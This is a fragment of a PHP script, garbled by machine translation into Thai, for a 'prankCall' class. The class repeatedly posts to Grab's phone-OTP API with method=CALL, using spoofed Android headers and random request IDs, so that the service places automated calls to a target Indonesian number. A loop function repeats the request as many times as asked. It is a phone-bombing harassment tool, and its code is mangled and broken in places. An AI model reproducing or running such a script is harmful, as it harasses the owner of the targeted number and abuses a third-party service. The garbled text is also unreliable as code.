จำนวน = $ no; } ฟังก์ชันส่วนตัว get () {return trim (fgets (STDIN)); } ฟังก์ชันส่วนตัวถูกต้อง ($ no) {$ cek = substr ($ no, 0,2); ถ้า ($ cek == "08") {$ no = "62" .substr ($ no, 1); } คืน $ ไม่; } ฟังก์ชันส่วนตัว ekse () {$ no = $ this-> ถูกต้อง ($ this-> number); $ แรนด์ = แรนด์ (0123456,9999999); $ rands = $ this-> randStr (12); $ post = "method = CALL & countryCode = id & phoneNumber = $ no & templateID = pax_android_production"; $ h [] = "x-request-id: ebf61bc3-8092-4924-bf45- $ rands"; $ h [] = "ยอมรับภาษา: in-ID; q = 1.0, en-us; q = 0.9, en; q = 0.8"; $ h [] = "User-Agent: Grab / 5.20.0 (Android 6.0.1; Build $ rand)"; $ h [] = "ประเภทเนื้อหา: application / x-www-form-urlencoded"; $ h [] = "ความยาวเนื้อหา:" .strlen ($ post); $ h [] = "โฮสต์: api.grab.com"; $ h [] = "การเชื่อมต่อ: ปิด"; $ ch = curl_init (); curl_setopt ($ ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp"); curl_setopt ($ ch, CURLOPT_POST, 1); curl_setopt ($ ch, CURLOPT_POSTFIELDS, $ post); curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ h); curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, 1); $ x = curl_exec ($ ch); curl_close ($ ch); $ ekse = json_decode ($ x จริง); ถ้า (ว่าง ($ ekse ['challengeID'])) {echo "Gagal \ n"; } else {echo "Sukses \ n"; }} ฟังก์ชั่นส่วนตัววนซ้ำ ($ many, $ sleep = null) {$ a = 0; $ no = $ this-> ถูกต้อง ($ this-> number); ในขณะที่ ($ a <$ many) {$ rand = rand (0123456,9999999); $ rands = $ this-> randStr (12); $ post = "method = CALL & countryCode = id & phoneNumber = $ no & templateID = pax_android_production"; $ h [] = "x-request-id: @xptra | SGB- ทีม # \ n ################################## \ n "; echo"? Number "; $ no = get (); $ n = new prankCall ($ no); $ n-> run ();
